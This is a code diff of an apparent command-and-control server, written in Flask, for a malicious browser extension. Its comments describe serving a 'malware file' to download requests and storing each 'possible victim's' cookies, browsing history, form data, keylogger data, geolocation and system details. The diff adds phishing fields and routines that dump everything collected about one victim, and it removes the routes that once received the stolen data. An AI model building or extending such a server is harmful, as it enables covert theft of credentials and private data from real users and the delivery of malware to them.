@@ -52,7 +52,7 @@ DB_PATH = The path of the database
 MAL_FILE = the name of the malware file in "/Server/Control/files/" to be send to a download request
 """
 
-DB_PATH = __file__[:-6]+"DB\\test.sqlite"
+DB_PATH = __file__[:-6]+"DB\\DB.sqlite"
 MAL_FILE = "prueba.bat"
 
 """TESTING SECTION
@@ -70,7 +70,6 @@ def hello_world():
 #Create or restart DB and all other logger file
 @app.route("/initialize")
 def initialize():
-    log.main()
     create_database()
     return "Redoing all"
 
@@ -83,47 +82,6 @@ def control_server():
                                         #Such that any Post can be reed and analize for future implementation
     return "thanks"
 
-"""
-NON_DATABASE_LOGGING
-
-Each of this routes and functions has the purpose of Logging formatted information 
-received, this is only used by "/Extension". The following distribution is followd
-"/g" = geolocation Data
-"/c" = Cookie Data
-"/f" = Form Data
-"/h" = Historial Data
-"/k" = KeyLogger Data
-"/u" = URL DATA
-For better understanding of each of this Datas please go to "/Extension" or "/Server/log.py"
-
-Assume that all of them take the received information and redirec them to the correct fucntion in log.py
-The return statement will be ignored by the extension
-"""
-
-@app.route("/g", methods=['POST'])
-def g():
-    log.log("Geo", request.get_data())
-    return "Done"
-@app.route("/c", methods=['POST'])
-def c():
-    log.log("Coo", request.get_data())
-    return "Done"
-@app.route("/f", methods=['POST'])
-def f():
-    log.log("Form", request.get_data())
-    return "Done"
-@app.route("/h", methods=['POST'])
-def h():
-    log.log("His", request.get_data())
-    return "Done"
-@app.route("/k", methods=['POST'])
-def k():
-    log.log("Key", request.get_data())
-    return "Done"
-@app.route("/u", methods=['POST'])
-def u():
-    log.log("Url", request.get_data())
-    return "Done"
 
 """
 COMMUNICATION_SERVER_EXTENSION
@@ -152,13 +110,11 @@ def req(uid):
                     (uid)) #Query all information in the correct Table
     rows = cur.fetchone() #UID is unique, so only one fetch is needed
     conn.close() #close connection
-    print(type(rows))
     if(rows == None): #If uid that is not in the database is used, return False, print in console information
         print("Not in Database: ", uid) 
         return "False"
     else: #If uid is in the database, give all information
-        print(rows)
-        return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4])
+        return jsonify(phase = rows[1], obj =  rows[2], tar = rows[3], nam = rows[4], chi = rows[5], con = rows[6], par = rows[7])
 
 @app.route('/download')
 def downloadFile (): #extremly simple route for the extension to download a file
@@ -207,9 +163,12 @@ def create_database(): #The creation of the DATABASE, does not drop all informat
                 CREATE TABLE IF NOT EXISTS Users (
                     uid INTEGER PRIMARY KEY,
                     phase INTEGER,
-                    obj TEXT,
-                    tar TEXT,
-                    nam TEXT
+                    downObj TEXT,
+                    downTar TEXT,
+                    downNam TEXT,
+                    phiChild TEXT,
+                    phiCont TEXT,
+                    phiParent TEXT
                 )                
                 """)
     #ContentSettings Table, store the content settings of a possible victim by UID
@@ -258,35 +217,35 @@ def create_database(): #The creation of the DATABASE, does not drop all informat
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Cookies (
                     uid INTEGER ,
-                    cookies BLOB,
+                    cookies TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Historial (
                     uid INTEGER ,
-                    historie BLOB,
+                    historie TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Downloads (
                     uid INTEGER ,
-                    down BLOB,
+                    down TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Proxies (
                     uid INTEGER ,
-                    proxy BLOB,
+                    proxy TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Extensions (
                     uid INTEGER ,
-                    extension BLOB,
+                    extension TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
@@ -301,14 +260,14 @@ def create_database(): #The creation of the DATABASE, does not drop all informat
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS Cpus (
                     uid INTEGER ,
-                    cpu text,
+                    cpu TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
     cur.execute("""
                 CREATE TABLE IF NOT EXISTS OS (
                     uid INTEGER ,
-                    os text,
+                    os TEXT,
                     FOREIGN KEY(uid) REFERENCES Users(uid)
                 )                
                 """)
@@ -342,12 +301,15 @@ def edit(number):
     if request.method == 'POST': #the request information to be obtained from the edit html
         item_uid    = number
         item_phase = request.form['phase']
-        item_obj = request.form['obj']
-        item_tar = request.form['tar']
-        item_nam = request.form['nam']
+        item_obj  = request.form['obj']
+        item_tar  = request.form['tar']
+        item_nam  = request.form['nam']
+        item_Chil = request.form["chi"]
+        item_cont = request.form["con"]
+        item_par  = request.form["par"]
     
-        cur.execute("UPDATE Users SET phase = ?, obj = ?, tar = ?, nam =? WHERE uid = ?",
-                    (item_phase, item_obj,item_tar, item_nam, item_uid)) #updating values with new ones
+        cur.execute("UPDATE Users SET phase = ?, downObj = ?, downTar = ?, downNam =?, phiChild = ?, phiCont =?, phiParent =? WHERE uid = ?",
+                    (item_phase, item_obj,item_tar, item_nam, item_Chil, item_cont, item_par ,item_uid)) #updating values with new ones
         conn.commit()
         
         return flask.redirect('/list') #return to route "/list" to see changes done
@@ -413,7 +375,7 @@ def extadd(number):
     8 = Cpu 
     9 = Proxie
     10 = OS
-    None = New User Register
+    Other = New User Register
     '''
 
     if (number == 1): 
@@ -482,20 +444,69 @@ def get_data(uid):
     # query table1
     c.execute('SELECT * FROM Users WHERE uid=?', (uid,))
     col_names = [description[0] for description in c.description]
-    data['table1Col'] = col_names
-    data['table1'] = c.fetchall()
+    data['UsersCol'] = col_names
+    data['Users'] = c.fetchall()
     
     # query table2
     c.execute('SELECT * FROM ContentSettings WHERE csuid=?', (uid,))
     col_names = [description[0] for description in c.description]
-    data['table2Col'] = col_names
-    data['table2'] = c.fetchall()
+    data['ContentSettingsCol'] = col_names
+    data['ContentSettings'] = c.fetchall()
 
     # query table3
     c.execute('SELECT * FROM PrivacySettings WHERE psuid=?', (uid,))
     col_names = [description[0] for description in c.description]
-    data['table3Col'] = col_names
-    data['table3'] = c.fetchall()
+    data['PrivacySettingsCol'] = col_names
+    data['PrivacySettings'] = c.fetchall()
+
+    # query table4
+    c.execute('SELECT * FROM Cookies WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['CookiesCol'] = col_names
+    data['Cookies'] = c.fetchall()
+
+    # query table5
+    c.execute('SELECT * FROM Cpus WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['CpusCol'] = col_names
+    data['Cpus'] = c.fetchall()
+
+    # query table6
+    c.execute('SELECT * FROM Downloads WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['DownloadsCol'] = col_names
+    data['Downloads'] = c.fetchall()
+
+    # query table7
+    c.execute('SELECT * FROM Extensions WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['ExtensionsCol'] = col_names
+    data['Extensions'] = c.fetchall()
+
+    # query table8
+    c.execute('SELECT * FROM Geolocations WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['GeolocationsCol'] = col_names
+    data['Geolocations'] = c.fetchall()
+
+    # query table9
+    c.execute('SELECT * FROM Historial WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['HistorialCol'] = col_names
+    data['Historial'] = c.fetchall()
+
+    # query table10
+    c.execute('SELECT * FROM OS WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['OSCol'] = col_names
+    data['OS'] = c.fetchall()
+
+    # query table11
+    c.execute('SELECT * FROM Proxies WHERE uid=?', (uid,))
+    col_names = [description[0] for description in c.description]
+    data['ProxiesCol'] = col_names
+    data['Proxies'] = c.fetchall()
+
 
     # close the connection to the database
     conn.close()
@@ -506,7 +517,7 @@ def get_data(uid):
     for key, value in data.items():
         str_data += str(key) + ': ' + str(value) + '\n'
         if i ==1:
-            str_data += '\n'
+            str_data += '\n\n\n'
             i = 0
         else:
             i = 1
